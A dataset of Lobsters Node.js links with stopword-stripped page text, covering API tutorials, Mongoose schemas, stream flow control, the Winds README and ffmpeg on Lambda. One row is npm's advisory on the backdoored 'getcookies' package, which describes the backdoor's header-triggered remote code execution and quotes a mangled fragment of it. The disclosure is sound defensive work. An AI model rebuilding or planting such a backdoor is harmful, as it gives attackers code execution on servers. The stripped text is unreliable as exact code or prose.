204,Lobsters,nodejs,Node.js programming,"How to set-up a powerful API with Nodejs, GraphQL, MongoDB, Hapi, and Swagger — Part II",https://medium.com/@wesharehoodies/how-to-set-up-a-powerful-api-with-nodejs-graphql-mongodb-hapi-and-swagger-part-ii-80266790a3ac,setup powerful api nodejs graphql mongodb hapi swagger part ii,graphiql inbrowser ide exploring graphql http,root query serve servernotice field section convoluted passing name field type paintingtype args field let ask would find specific painting need kind argument sort case would idnext resolve function two parameter parent argsjust illustrate graphql query look like followinggraphql query visualizationthe painting query paintingtypejs notice pas argument args parameter resolve parent would used complex query nesting going onlet export root query pas hapi server notice type graphqlschema root queryschema definition pas serverexporting graphql schemagoing back indexjs require graphql package schemajsnext need register hapigraphql plugininside serverregister pas graphql configurationregistering graphiql pluginfairly simple eh installed graphiql plugin notice graphiql graphql graphiql inbrowser ide exploring graphqlnext let register new plugin graphqlhapi includes schema made earliernow head http
205,Lobsters,nodejs,Node.js programming,"How to set-up a powerful API with Nodejs, GraphQL, MongoDB, Hapi, and Swagger",https://medium.freecodecamp.org/how-to-setup-a-powerful-api-with-nodejs-graphql-mongodb-hapi-and-swagger-e251ac189649?source=user_profile---------4-------------------,setup powerful api nodejs graphql mongodb hapi swagger,rest apis api nodejs mongodb fastify swagger github javascript knowledge nodejs mongodb rest apis technology using need following installed ide terminal hyper let get started terminal npm packagejson dependancies nodemon nodemon mongoose fastify fastifyswagger swagger boom setup server create first route fastify fastify fastify terminal http start mongodb create model mongodb mongodb mongodb mongodb mongoose mongodb mongoose create car controller boom async await async function async function learn learn learn javascript learn javascript learn mongoose controller route route create import route controller id http putting together testing api api route fastify postman swagger adding swagger wrapping config fastifyswagger fastify http whats next graphql vuejs,presumably web developer stranger rest apis challenge architecting effective efficient api solution bringsthese challenge include speed api response time documentation clear concise document describing api architecture sustainability maintainable expandable codebase tutorial going address using combination nodejs mongodb fastify swaggerthe source code project available githubbefore beginnerintermediate javascript knowledge heard nodejs mongodb know rest apis arebelow link get updated technology using good idea open page new tab easy referenceyou need following installed also need ide terminal use mac hyper windowslet get started initialise new project opening terminal executing following line code mkdir fastifyapi cd fastifyapi mkdir src cd src touch indexjs npm initin code created two new directory navigated created indexjs file initialed project via npmyou prompted enter several value initialising new project leave blank update later stageonce completed packagejson file generated src directory file change value entered project initialisednext install dependancies need npm nodemon mongoose fastify fastifyswagger boombelow brief description package quoted respective website nodemonnodemon tool help develop nodejs based application automatically restarting node application file change directory detectednodemon require additional change code method development nodemon replacement wrapper node use nodemon replace word node command line executing scriptto set nodemon need add following line code packagejson file script object start nodemodulesnodemonbinnodemonjs srcindexjs packagejson file look follows name fastifyapi version description blazing fast rest apis nodejs mongodb fastify swagger main indexjs script start nodemodulesnodemonbinnodemonjs srcindexjs test echo error test specified exit author siegfried grimbeek siegfriedgrimbeek gmailcom wwwsiegfriedgrimbeekcoza license isc dependency boom fastify fastifyswagger mongoose nodemon mongoosemongoose provides straightforward schemabased solution model application data includes builtin type casting validation query building business logic hook boxfastifyfastify web framework highly focused providing best developer experience least overhead powerful plugin architecture inspired hapi express far know one fastest web framework townfastifyswaggerswagger documentation generator fastify us schema declare route generate swagger compliant docboomboom provides set utility returning http errorssetup server create first route add following code indexjs file require framework instantiate const fastify require fastify logger true declare route fastifyget async request reply return hello world run server const start async try await fastifylisten fastifyloginfo server listening fastifyserveraddress port catch err fastifylogerror err processexit start require fastify framework declare first route initialise server port code pretty self explanatory take note option object passed initialising fastify require fastify framework instantiate const fastify require fastify logger true code enables fastify built logger disabled defaultyou run follow code src directory terminal npm startnow navigate http see hello world object returnedwe get back indexjs file let move setting databasestart mongodb create model mongodb successfully installed open new terminal window start mongodb instance running following mongodwith mongodb need create database specify name setup soon store data mongodb create database usadd following indexjs file require external module const mongoose require mongoose connect db mongooseconnect mongodb localhostmycargarage consolelog mongodb catch err consolelog err code require mongoose connect mongodb database database called mycargarage went well see mongodb connected terminalnotice restart app thanks nodemon package added earliernow database running create first model create new folder within src directory called model within create new file called carjs add following code external dependancies const mongoose require mongoose const carschema new mongooseschema title string brand string price string age number service type map string moduleexports mongoosemodel car carschema code declares carschema contains information related car apart two obvious data type string number also make use map relatively new mongoose read export carschema used within appwe could proceed setting route controller config indexjs file part tutorial demonstrating sustainable codebase therefore component foldercreate car controllerto get started creating controller create folder src directory called controller within folder create carcontrollerjs file external dependancies const boom require boom get data model const car require modelscar get car exportsgetcars async req reply try const car await carfind return car catch err throw boomboomify err get single car id exportsgetsinglecar async req reply try const id reqparamsid const car await carfindbyid id return car catch err throw boomboomify err add new car exportsaddcar async req reply try const car new car reqbody return carsave catch err throw boomboomify err update existing car exportsupdatecar async req reply try const id reqparamsid const car reqbody const updatedata car const update await carfindbyidandupdate id updatedata new true return update catch err throw boomboomify err delete car exportsdeletecar async req reply try const id reqparamsid const car await carfindbyidandremove id return car catch err throw boomboomify err may seem like little much take actually really simplewe require boom handle error boomboomify err export function use routeeach function async function contain await expression pause execution async function wait passed promise resolution resume async function execution return resolved value learn hereeach function wrapped try catch statement learn hereeach function take two parameter req request reply reply tutorial make use request parameter use access request body request parameter allowing u process data learn heretake note code line const car new car make use javascript spread operator learn heretake note code line const carthis make use javascript destructuring conjunction spread operator learn hereother make use standard mongoose feature used manipulate databaseyou probably burning fire api sanity check need connect controller route lastly connect route appcreate import routesonce start creating folder root directory project time called route within folder create indexjs file following code import controller const carcontroller require controllerscarcontroller const route method get url apicars handler carcontrollergetcars method get url apicars id handler carcontrollergetsinglecar method post url apicars handler carcontrolleraddcar schema documentationaddcarschema method put url apicars id handler carcontrollerupdatecar method delete url apicars id handler carcontrollerdeletecar moduleexports routeshere requiring controller assigning function created controller routesas see route consists method url handler instructing app function use one route accessedthe id following route common way pas parameter route allow u access id follows http together testing apinow part constructed need connect together start serving data via api firstly need import route created adding following line code main indexjs file const route require route need loop route array initialise fastify following code also need added main indexjs file routesforeach route index fastifyroute route ready start testing best tool job postman use test route sending data raw object body request parametersfinding car finding single car adding new car service appear empty information fact persist databaseupdating car deleting car fully functional api documentation swagger really handyadding swagger wrapping upnow create final folder called config inside create file called swaggerjs following code exportsoptions routeprefix documentation exposeroute true swagger info title fastify api description building blazing fast rest api nodejs mongodb fastify swagger version externaldocs url http swaggerio description find info host localhost scheme http consumes applicationjson produce applicationjson code object option pas fastifyswagger plugin need add following indexjs file import swagger option const swagger require configswagger register swagger fastifyregister require fastifyswagger swaggeroptions need add following line initialised fastify server await fastifylisten fastifyswagger fastifyloginfo listening fastifyserveraddress port navigate http see following simple self updating api documentation evolve api easily add additional information route see herewhats next basic api place possibility limitless used base app imaginablein next tutorial integrate graphql eventually integrate frontend vuejs
206,Lobsters,nodejs,Node.js programming,Modeling Formulas with Recursive Discriminators,http://www.petecorey.com/blog/2018/05/28/modeling-formulas-with-recursive-discriminators/,modeling formula recursive discriminator,mongoose nodejs mongodb discriminator embedded discriminator,recently ran issue trying represent nested discriminatorbased schema using mongoose nodejs client project goal represent logical formula creating hierarchy reducer would reduce series nested check single value let make little relatable example imagine trying represent following formula x x x wanted store mongodb represent somehow json object let take stab type reducer reducer check type check field x comparator value type reducer reducer check type check field x comparator value type check field x comparator value behemoth json representation ridiculously verbose mathematical representation give u everything need recreate formula let u store formula database exactly want trouble come try represent schema mongoose break entire json representation two distinct type check type field comparator value field reducer type reducer field check field contains list either check reducer object historically mongoose trouble field document adhering either one schema another changed introduction discriminator later embedded discriminator embedded discriminator let u say element array adheres one multiple schema defined different discriminator let make clear example wanted store formula within document start defining schema wrapping base document const baseschema new schema name string formula checkschema formula field hold formula define shell checkschema like const checkschema new schema discriminatorkey type id false setting discriminatorkey type mean mongoose look value type determine kind schema rest subdocument adhere next define type formula reducer reducer field formula field baseschemapath formula discriminator reducer new schema reducer type string enum check checkschema id false similarly check type unique set field baseschemapath formula discriminator check new schema field string comparator type string enum value number id false unfortunately work first level formula trying define toplevel reducer check work great trying put reducer check within reducer fails nested object stripped final object problem defining discriminator based path originating baseschema baseschemapath formula discriminator nested reducer subdocuments discriminator attached check fix need create two new function recursively build layer discriminator stack start buildcheckschema function simply return new schema check type subdocuments schema child need define new discriminator const buildcheckschema new schema field string comparator type string enum value number id false buildreducerschema function need little sophisticated first need create reducer type subschema next need attach reducer check discriminator check field new schema recursive call buildcheckschema buildreducerschema const buildreducerschema let reducerschema new schema reducer type string enum check checkschema id false reducerschemapath check discriminator reducer buildreducerschema reducerschemapath check discriminator check buildcheckschema return reducerschema work concept blow practice mongoose discriminator function greedily consumes schema passed creates infinite recursive loop blow top stack solution landed problem limit number recursive call make buildreducerschema maximum value add limit passing optional n argument buildreducerschema default every time call buildreducerschema within buildreducerschema pas incremented value n reducerschemapath check discriminator reducer buildreducerschema n next use value n enforce maximum recursion limit const buildreducerschema n n return buildcheckschema reach one hundred recursion simply force next layer check type schema gracefully terminating schema stack finish thing need pas baseschema recursively constructed discriminator without initial value n baseschemapath check discriminator reducer buildreducerschema baseschemapath check discriminator check buildcheckschema odds managed build nested discriminatorbased schema fully represent formula throw depth one hundred reducer deep end day happy solution
207,Lobsters,nodejs,Node.js programming,"It ain't about the callbacks, it's about the flow control",https://idea.popcount.org/2013-09-05-it-aint-about-the-callbacks/,ai nt callback flow control,ai nt callback flow control callback yup echo server echo server implicit property stream suffer race condition nodejs stream method return push pull,ai nt callback september flow control programmer tend opinionated programming callback programming style big deal usually becomes issue platform force use callback style talking javascript opinion people forget important point discussion callback problem different programming encourage different solution solution equally good particular forcing people use callback encourages bad solution common problem annoyingly make easy forget data flow control let start example broken nodejs api yup echo server naive echo server nodejs var net require net var server netcreateserver serveron connection function c con data function data cwrite data serverlisten two thing wrong code impossible slow pace accepting new incoming client connection noisy client able crash server cwrite nonblocking buffer infinite amount data memory partially solved nodejs stream api later implicit accept first problem ca nt slow pace accepting new connection accept syscall implicitly handled node far know nt way around caused design nonblocking api nt support flowcontrol ca nt tell server nt accept client connection please astute reader may notice servermaxconnections property cause client socket closed limit reached nt want client get actively rejected nt want accept first place ideal programming environment accept would blocking main coroutine server looking like true canservemoreclients client serveraccept dealwiththeclient client else blockuntilcanservemoreclients work around problem nodejs could add new method pause netserver bad design well let explain using second illustration design nodejs stream stream suffer race condition nodejs stream common api support basic flow control common data source read andor write code client socket valid nodejs stream using stream api code get even simpler var net require net var server netcreateserver serveron connection function c cpipe c serverlisten pipe command forward data received data event write method code nt suffer described problem single client wo nt able crash node outofmemory work follows data event byte passed write method write method return false meaning please stop writing stream understands call pause method reader drain event reader resume result stream stop reading c data ca nt written c clever right first believe nodejs programmer including nt understand stream nt implement stream interface correctly even stream properly implemented everywhere api suffers race condition possible get plenty data writer reacts stop reader stream need actively inform reader something happens writer like line people passing brick last person say brick please everybody line hand full longer queue brick get buffered particularly node using stream possible receive plenty data back pressure kick var net require net var server netcreateserver serveron connection function c cpipe c con data function consolelog received dlength con drain function consolelog okay receive var p cpush cpush function chunk var r papply c chunk r false consolelog stop receiving return r serverlisten run code start noisy client flood server plenty data see okay receive received stop receiving received received chunk data told server stop receiving real world problem even serious usually significant delay reader writer even data get buffered let try make concrete imagine web server need speak redis sql database read local file crafting http response writer may notice network connection slow react accordingly tell reader stop receiving new request client meantime time passed server could already received thousand http request evil client race condition stream api serious due fact delay receiving evil request noticing evil client nt read significant code solution problem deliver exactly one data chunk wait confirmation receiving another one using brick analogy last person would shout please give new brick dealt last one thus guaranteeing matter many hand line one brick processed time damage throughput guarantee wo nt run memory even case evil client push pull programming code written one two way pull data source push data destination synchronous code usually first thing callback second neither better worse pull model much easier reason flow control hand badly written push code fast producer slow consumer overwhelm program synchronous code embeds flow control structure much harder express data flow control using finally please nt get wrong although rant focused around nodejs limited generally hard think endtoend flow control callback based environment impossible design good callback based api nt tool deal data flow control
208,Lobsters,nodejs,Node.js programming,Why is Front-End Development So Unstable?,http://www.breck-mckye.com/blog/2018/05/why-is-front-end-development-so-unstable/,frontend development unstable,quantifying issue github react friend unix philosophy npm problem imagine junior developer done wary medium consider nonmicrolib architecture vuejs next oversweat employablity thing note,know meme time learned one frontend technology another three released also one learned deprecated often see examination typical explanation la rprogramming seems something webdevs naturally impatient faddish incompetent may constitute general fallacy assuming behaviour understand caused entire group foolish wicked greedy whereas unwise behaviour due exclusively factor beyond control still fallacy problem quantifying issuebefore get carried away worth validating whether meme really basis reality front end technology actually change quickly sense major view technology probably consider list highest starred javascript frontend technology github library star released age react march year vue october year angular october year jquery august year angular december year backbone october year polymer may year ember december year aurelia june year knockout july year year youngest old scheme thing le half support lifespan typical desktop o example still way caricature causing perception rapid even unsustainable change react friendsit might react powerful tool requires army helper module support library used seriously problem set react community big would call microlibrary architecture application composed myriad discrete singlepurpose javascript library homage unix philosophy advantage architecture easily adapt new practice emerge make sense time rapid innovation like past year disadvantage increase surface area breaking change demand great deal often much vetting selection said microlibs thrust argument wrong javascript language web technology particular poor choice architecture make developer slave fad trend npm problemmodern javascript greatest asset liability npm provides enormous wealth module catering specific purpose one conceive difficult filter curate one really supported one actually functionally correct one really vector evil malware heuristic javascript developer really use popularity number downloads github star exacerbates faddishness way validate library course read github issue search stackoverflow question testing even examine sourcecode case take time really warranted choosing eg date parsing doodad concede something cultural weakness javascript developer interviewer often like ask candidate choose technology depresses somewhat popularity almost always marker know software engineering least partly research job need train junior programmer research skill even odds would still stacked imagine junior developerput shoe juniortomidlevel javascript developer writing new application first time start innocently enough completely clean slate want keep thing simple devout agilist yagni watchword begin simple barbones framework sound good even often choice got barebones little task fall shoulder choose helper library frontend work might helper redux form api request backend might middlewares express google search reveals medium post heartily recommends xjs later transpires post written x author though never announces particular conflict interest however provide gittip jar could tell medium article look never rely brand identify reputable material miss reply pointing critical inadequacy xjs medium deliberately suppresses move finding time find link twitter hundred heart guess pretty good signal curated community knowledgeable add heart gratitude like hundred follow link github fast link old library deprecated tell word deprecated slapped everywhere like condemned sign scooby doo themepark see yjs object oriented thought good thing vaguely recalling something first year comsci smalltalk message passing apparently bad another medium article try explain though reasoning hazy packed dense terminology recognise later turn terminology invented post author neutrallooking external blog post cited authority argument get worse post claim even mentioning oop javascript interview render utterly unemployable seriously disoriented thankfully help hand form dollar javascript webdev course take note link thinking lucky found give another clap gratitude nineteen thousand one move onto zjs seems lot github star though documentation seems le useful lot method listed practically use heartened least see us something called standard j assume something ecma standard committee could better junior developer guide senior developer learning go caught avalanche trying keep date remain employable take path least resistance choose github project vote star javascript dev driven fad hype done like natural complainer generally better moaning problem know solving idea wary mediummedium incentivises clickbait somewhat make harder distinguish authoritative content classical blogging allows good author establish distinct visual theme help visitor recognise source helped last year seen much aggressive selfmarketing javascript world possibly due rise paid online training material employmentconsulting advantage github celebrity problem people incentivised good content increasingly feel see dishonest tactic selfcitation invented proprietary terminology searching take back author material namesquatting eg standardjs consider nonmicrolib architecturestry start project framework provide large surface area feature require many plugins get productive immediately reduce number moving part exposure unexpected breaking change one reason interested vuejs could also use react part starter kit larger framework like next oversweat employablity thingthe people need know company whole stack inside day zero freelance contractor paid handsome wage parachute get project door otherwise employer absolutely fine knowing in out latest react helper library avoid call learn absolutely everything noise note though many many fault believe express requires middleware parse json post body sorry utterly banana
209,Lobsters,nodejs,Node.js programming,NPM failing with HTTP 418 I'm a teapot,https://github.com/npm/npm/issues/20791,npm failing http teapot,join github today sign comment npm heated reload reload,repository archived owner readonly dismiss join github today github home million developer working together host review code manage project build software together sign comment npm locked heated limited conversation collaborator may perform action time signed another tab window reload refresh session signed another tab window reload refresh session
210,Lobsters,nodejs,Node.js programming,Winds 2.0 - Open Source Podcast & RSS app,http://github.com/getstream/winds,wind open source podcast r app,wind beautiful open source r podcast app powered getstreamio description stream algolia aws mongodb atlas sendgrid getting started latest release new macos linux window http windsgetstreamio featured r podcasts wind getstreamio feature glance beautiful ui r podcast recommendation integrated search podcast player r reader tocd roadmap roadmap powered express react redux algolia mongodb atlas sendgrid bull mercury stream sentry aws full stack found stackshareio stream stream algolia algolia javascript search client mongodb mongodb atlas tutorial blog post note http getstreamiowinds implementing search algolia stream wind running nodejs production environment creating restful api design expressjs takeaway building react based app electron wind stack building touch bar support macos electron react testing nodejs simple step optimize app performance mongodb redis nodejs getting started wind open source deploying wind app amazon cloudfront deploying wind api aws ec docker compose download http getstreamiowinds contributing wind tl dr clone repo install dependency homebrew start mongodb locally homebrew official mongodb site start redis locally homebrew official redis site loading test data username password username password stream sign create stream app stream add stream app id api key api secret create stream feed group algolia sign algolia create algolia app index algolia sign algolia application page add algolia application id searchonly api key admin api key file start backend service start frontend electron web app server running test folder adding new test mocha documentation folder building production version prepare build docker build docker container api worker debugging r podcast issue podcasts open graph scraping r discovery article parsing w mercury support github issue instruction maintenance contribution special shoutouts primary maintainer contributor revive r wind time revive r,wind beautiful open source r podcast app powered getstreamio description wind beautiful opensource r podcast app created using react redux frontend expressjs backend use free hosted version run server customize see fit contribution form pull request always appreciated activity feed discovery wind powered stream app leverage algolia search aws hosting mongodb atlas hosted database dbaas sendgrid email service free tier getting started get started wind please download latest release new addition desktop apps macos linux window web version wind available http windsgetstreamio featured r podcasts popular r podcast want featured reach wind getstreamio reply every message feature glance wind packed full awesome feature behind beautiful user interface user experience quick look project offer beautiful ui r podcast recommendation integrated search podcast player r reader tocd roadmap help u improve wind andor vote roadmap powered express react redux algolia mongodb atlas sendgrid bull mercury stream sentry aws full stack found stackshareio stream stream api building activity feed wind follow suggestion list article feed follow powered stream stream account free million feed update handle personalization machine learning user algolia algolia used lightning fast relevant search use javascript search client easily setup wind search implementation algolia account free record operation mongodb mongodb atlas provides database service serf backend datastore wind tutorial blog post following tutorial help start contributing wind also provide inspiration next app note actively working portion readme stay date latest information please signup hosted version http getstreamiowinds implementing search algolia stream wind running nodejs production environment creating restful api design expressjs takeaway building react based app electron wind stack building touch bar support macos electron react testing nodejs simple step optimize app performance mongodb redis nodejs getting started wind open source deploying wind app amazon cloudfront deploying wind api aws ec docker compose download download wind visit http getstreamiowinds contributing wind tl dr command brew install redis mongodb brew service start mongodb brew service start redis cd wind cd api yarn cd app yarn sign stream algolia create following env file app directory replacing key indicated databaseurimongodb localhostwindsdev cacheuriredis jwtsecretyourjwtsecret reactappapiendpointhttp streamapibaseurlhttps streamappidyourstreamappid reactappstreamappidyourstreamappid reactappstreamapikeyyourstreamapikey reactappstreamanalyticsyourstreamanalyticstoken streamapikeyyourstreamapikey streamapisecretyourstreamapisecret reactappalgoliaappidyouralgoliaappid reactappalgoliasearchkeyyouralgoliasearchonlyapikey algoliawritekeyyouralgoliaadminapikey note running test suite need test version env file inside apitest directory run start processdevjson cd app yarn start clone repo git clone git githubcom getstreamwindsgit install dependency following instruction geared towards mac user use brew homebrew install dependency ubuntu user use apt window user install directly dependency site nondebianbased linux user probably able figure cd windsapp yarn cd api yarn start mongodb locally wind us mongodb main datastore contains user r feed podcasts episode article share mac install mongodb homebrew running brew install mongodb also install mongodb official mongodb site also run mongodb background running brew service start mongodb start redis locally stream use redis inmemory storage wind podcast processing r processing worker contains list podcasts r feed worker pick process using bull messaging system mac install redis homebrew running brew install redis also install redis official redis site start redis running redisserver creates default dumprdb file current directory store cached version database location also run redis background running brew service start redis loading test data testing purpose want use test data located use mongoimport mongorestore import data two username password combination testing username admin admincom password admin username test testcom password test need run flushall command redis ensure new content picked note override local data may please cautious also create stream follows please follow feed manually generate stream sign create stream app contribute wind sign stream utilize activity timeline feed reminder stream free application le update per month add stream app id api key api secret env append stream app id api key api secret env file streamappidyourstreamappid streamapikeyyourstreamapikey streamapisecretyourstreamapisecret create stream feed group signed create feed group stream app feed group defines certain type feed within application use add feed group button create following feed feed group name feed group type podcast flat r flat user flat timeline flat folder flat userepisode flat userarticle flat fine enable realtime notification feed group though wo nt using yet algolia sign algolia create algolia app index addition stream also need sign algolia contribute wind search functionality algolia free application record sign algolia application page click new application create new algolia application recommend something similar mywindsapp select datacenter closest application page select index click add new index recommend something similar windsmainindex add algolia application id searchonly api key admin api key env file app click api key button left find app id api key append algolia application id searchonly api key admin api key env file look like reactappalgoliaappidyouralgoliaappid reactappalgoliasearchkeyyouralgoliasearchonlyapikey algoliawritekeyyouralgoliaadminapikey start backend service root directory run start processdevjson see logging information process run log start frontend electron web app server cd app yarn start running test wind api server us test located apitest folder file structure intentionally mirroring file apisrc simplify matching test tested code run test cd api yarn run test run test extended stack trace useful debugging async issue cd api yarn run testdeep adding new test add code file apitest folder preferably mirroring existing file apisrc folder refer mocha documentation example using bddlike dsl writing test module mocked apitestentryjs mock installed module loaded fixture loaded via loadfixture function apitestfixtures folder various utility function provided apitestutiljs see test example usage building production version build production version wind running root directory apibuildsh creates productionready j file apidist run production j file start processprodjson prepare build docker cd api cd script makebuildsh build docker container api worker cd dockercompose command prepare start api worker frontend still need started manually debugging r podcast issue unfortunately unified standard r go api directory run yarn link make command available wind r http techcrunchcomfeed podcasts wind podcast http wwwnprorgrsspodcastphp open graph scraping wind og http r discovery wind discover mashablecom article parsing w mercury wind article http pull request improved r compatibility much appreciated parsing codebase located apisrcparsers support support handled via github issue unfamiliar creating issue github please follow instruction maintenance contribution thank maintainer contributor helped wind become today help stay running every day could nt without special shoutouts primary maintainer contributor revive r r amazing open standard probably pleasant way stay date site podcasts care reason contributing wind explained blogpost wind time revive r section list open source commercial project impact reviving r
211,Lobsters,nodejs,Node.js programming,Reported malicious module: getcookies,https://blog.npmjs.org/post/173526807575/reported-malicious-module-getcookies,reported malicious module getcookies,initial report triage action took timeline,early may npm security team received responded report package masqueraded cookie parsing library contained malicious backdoor result investigation concluded three package three version fourth package unpublished npm registryno package published npm registry used malicious module way would allowed backdoor triggered application published registry directly required malicious module might vulnerable scope analysisinitial reportinitial information community reported package getcookies contained potential backdoor expresscookies httpfetchcookies depended upon getcookies popular package mailparser depended upon httpfetchcookiestriageupon receiving report npm security team started triage goal triage determining whether reported package fact contain malicious code impacted communitywe disclose entire backdoor give highlight noted reviewedthe backdoor worked parsing usersupplied http requestheaders looking specifically formatted data provides three different command backdoor jsonstringify reqheaders replace g h igi p v see header stringified result searched value format gcommandhdataithe control flow code available code code located buffer calling vmruninthiscontext providing moduleexports require req re next remote code memory executionthese control code allowed attacker input arbitrary code running server execute itbeyond backdoor code aspect module account also stood based reverse image search profile image user published getcookies appeared stock photothe github user linked npm package created marchdownload count spiked week ago getcookies expresscookies httpfetchcookies seems correlate version mailparser published depended upon httpfetchcookie mailparser httpfetchcookies expresscookies dependency relationship reported modulesdespite deprecated mailparser still receives weekly downloads searched user module might impacted determined published version mailparser depended httpfetchcookies use module way eliminating risk backdoor posed speculate mailparser requiring httpfetchcookies execute attack future inflate download count expresscookies add legitimacyultimately mailparser user impacted user directly required used expresscookies getcookies package would impactedactions tookremoved user unpublished getcookies expresscookies httpfetchcookies removed version mailparser depended httpfetchcookies module reset npm token author mailparser prevent unauthorized publishestimelineall time pacific daylight time community team started getcookies expresscookies token mailparser mailparser version
212,Lobsters,nodejs,Node.js programming,Running FFmpeg on AWS Lambda for 1.9% the cost of AWS Elastic Transcoder,https://intoli.com/blog/transcoding-on-aws-lambda/,running ffmpeg aws lambda cost aws elastic transcoder,encodes title least different format optimizes encoding setting pertitle basis aws elastic transcoder ffmpeg exodus aws lambda intoliarticlematerials looking job exciting startup shoot u email bundling ffmpeg lambda docker ldd elf glibc official aws recommendation exodus nix exodus readme new exodus setting access permission aws commandline interface already configured credential set default region aws api gateway aws identity access management iam aws lambda aws aws mb document aws iam createrole jq amazon resource namearn aws iam putrolepolicy transcoder lambda function node yarn new nodejs aws lambda runtime awssdk request tempy contentdisposition header aws lambda createfunction aws cp aws lambda updatefunctioncode wavsourcecom caine mutiny aws lambda invoke intermissionconclusion making youtube downloader exodus ffmpeg aws lambda blog subscribe monthly article newsletter intoliarticlematerials repository,delivering medium content internet important keep mind factor like network bandwidth screen resolution codec support vary drastically different device connection certain medium encoding better suited certain viewer transcoding source medium multiple format must order ensure delivering best possible experience user netflix example encodes title least different format optimizes encoding setting pertitle basis obviously bit outlier even something simple using fallback video tag tremendous impact user experience transcoding file site probably get away running thing manually laptop thing get bit complicated need trigger transcoding task programmatically scalable way instance imagine would like build service extracting video file number way one could go accomplishing something like could use amazon aws elastic transcoder service could run server ffmpeg installed handle transcoding building medium transcoding service tutorial use either two method instead using exodus bundle ffmpeg inside aws lambda function performing transcoding task might sound similar running ffmpeg server significant difference using lambda mean transcoder automatically scale handle whatever volume request throw cost proportional usage way lambda transcoder similar using elastic transcoder managing infrastructure use elastic transcoder instead lambda well one thing lambda tutorial technique cover including complex native binary lambda function generally useful outside context transcoding primary purpose article said cost saving using lambda rather specialized service massive practicality choice well let quick price comparison elastic transcoder transcoder lambda function build cost transcoding audio elastic transcoder per minute audio lambda pricing bit complicated depends execution time ram allocation cost per gbsecond transcoding minute audio function develop requires shy gbseconds put overall cost per minute audio full factor time le elastic transcoder top perpetuallyfree tier elastic transcoder allows minute audio transcoding per month lambda perpetuallyfree tier gbseconds per month translates day free audio transcoding per month comparable amount transcoding would cost elastic transcoder free tier really important small side project one area lambda really shine also want stress lambda function building anything near full drop replacement elastic transcoder designed audioonly transcoding support maximum minute audio per invocation error handling etc point comparison elastic transcoder ripoff lambda often result significant cost saving welldefined use case compatible limitation lambda imposes lambda relatively good fit something like simple youtube downloader service already pushing limit single lambda invocation handle tutorial walk full process developing deploying lambda function transcoding audio also often helpful see everything fit together one place finished code project also available intoliarticlematerials repository feel free head would like skip ahead see finished product post supplementary material technical article starring repository also good way find working something new interesting said let get started actually building microservice looking job exciting startup close personal friend building awesome tutoring platform looking hire sound like something might interested shoot u email get touch bundling ffmpeg lambda one challenging component developing complex lambda function packaging native dependency function relies ever worked docker probably know convenient able create container image preinstalled requirement even though lambda function run container comparable way customize installed package system get put mb file vartask reason packing native code challenge linux software tends dynamically rather statically linked necessity allowing different package reuse dependency also make relocating software extremely challenging let take quick look ffmpeg example ffmpeg binary computer measly kb include file part lambda function try run would get following error ffmpeg error loading shared library open shared object file file directory use ldd list shared dependency ffmpeg need order run executing ldd ffmpeg reveals staggering direct dependency even counting secondary dependency library depend first ten give general idea pretty clear missing file really tip iceberg say tracked dependency placed lib subdirectory set ldlibrarypath environment variable vartasklib invoking ffmpeg lambda function would everything work nope maybe probably even correct library library search path elf executables hardcoded interpreter path kernel use start program checked printing elf program header readelf programheaders ffmpeg system file exist lambda execution environment ffmpeg library search path even worse interpreter compiled different glibc version likely get either glibc relocation error extremely subtle buggy execution behavior official aws recommendation dealing issue compile native binary ami lambda based problem system library version lambda somewhat ancient incompatible lot newer software quickly turn rabbit hole compile library library eventually discover absolutely never going work due incompatibility chasing wild goose really cup tea glad tell built tool called exodus greatly simplifies process relocating native binary one linux system another process bundling local copy ffmpeg run lambda literally install exodusbundler package nt already pip install user exodusbundler export path home localbin path create ffmpeg bundle extract current directory exodus tarball ffmpeg tar zx command create exodus subdirectory includes fully relocatable copy ffmpeg run lambda linux system run exodusbinffmpeg library linker environment variable etc stuff dealt automatically bundle weighs mb allowing fit comfortably within mb limit lambda function contrast nix installation ffmpeg occupies mb includes many nonessential dependency better stop going much detail work check exodus readme new exodus lot detail actually really cool slightly tangential topic building youtube downloader setting access permission ffmpeg bundled time start configuring aws instruction use aws commandline interface assumed already configured credential set default region also generally assumed basic familiarity aws api gateway aws identity access management iam aws lambda aws probably still make guide used one specific service tutorial really meant first introduction amazon web service something else keep mind start configuring thing tutorial first part two part series second part series focus building youtube downloader service part solely focused bundling ffmpeg making selfcontained transcoding function transcoder instruction able stand naming thing setting permission anticipation resource later used build youtube downloader service transcoding lambda function produce output file need place store natural choice start creating new bucket using aws mb command note bucket name need globally unique need change something else store later use export bucketname actually create bucket aws mb bucketname go well command echo back success message like makebucket need set role lambda function grant necessary permission eventually going expose youtube downloader lambda function via api gateway list api gateway lambda principal service role policy document interested transcoding lambda function whole youtube downloader leave api gateway principal json pretty cumbersome write single line store multiline policy environment variable called rolepolicydocument using document read r rolepolicydocument eof version statement effect allow principal service apigatewayamazonawscom lambdaamazonawscom action sts assumerole eof use policy document create new role using aws iam createrole command also notice storing response environment variable using jq extract particular value json response case role amazon resource namearn convenience copy paste future command without needing manually replace thing like arns bucket name function name etc follow pattern future aws command want store part response variable store later use export rolename create new role store json response variable response aws iam createrole rolename rolename assumerolepolicydocument rolepolicydocument echo response terminal echo response store role arn future usage rolearn jq r rolearn response store arn new resource rolearn environment variable echo detail newly created role role path rolename roleid arn arn aws iam createdate assumerolepolicydocument version statement effect allow principal service apigatewayamazonawscom lambdaamazonawscom action sts assumerole creating role need give adequate permission following policy grant full access bucket created earlier well full access api gateway permission invoke lambda function production would want specify api gateway lambda function arns know created resource yet leave wildcards circle back tighten thing later desire read r policydocument eof version statement effect allow action apigateway resource arn aws apigateway effect allow action executeapi invoke resource arn aws executeapi effect allow action lambda resource effect allow action listallmybuckets resource arn aws effect allow action resource arn aws bucketname arn aws bucketname eof finally apply policy role created using aws iam putrolepolicy command store later use export policyname apply policy aws iam putrolepolicy rolename rolename policyname policyname policydocument policydocument point place store file role policy place allow u build full youtube downloader backend permission stuff le fun actually writing deploying code crucial order lambda function api work way move exciting part transcoder lambda function writing lambda function using node targeting nodejs aws lambda runtime using yarn manage dependency amazon actually also announced new nodejs aws lambda runtime would generally recommend using recent target new project already written following code target announced new runtime really make much difference know free use asyncawait syntax instead promise chain use newer target transcoding function three node dependency awssdk uploading file request downloading file tempy generating temporary file path install running yarn add awssdk request tempy place necessary package nodemodules directory note technically need install awssdk available default lambda environment convenient local copy development start coding let lay lambda function operate function accept event object contains following key filename filename use file contentdisposition header user downloads determines filename suggested user save computer logkey key output ffmpeg placed logging purpose key converted file placed bucket log file placed url url input audiovideo file downloaded function follow following step create temporary filename store input file output download input file url temporary location invoke local copy ffmpeg bundled earlier exodus 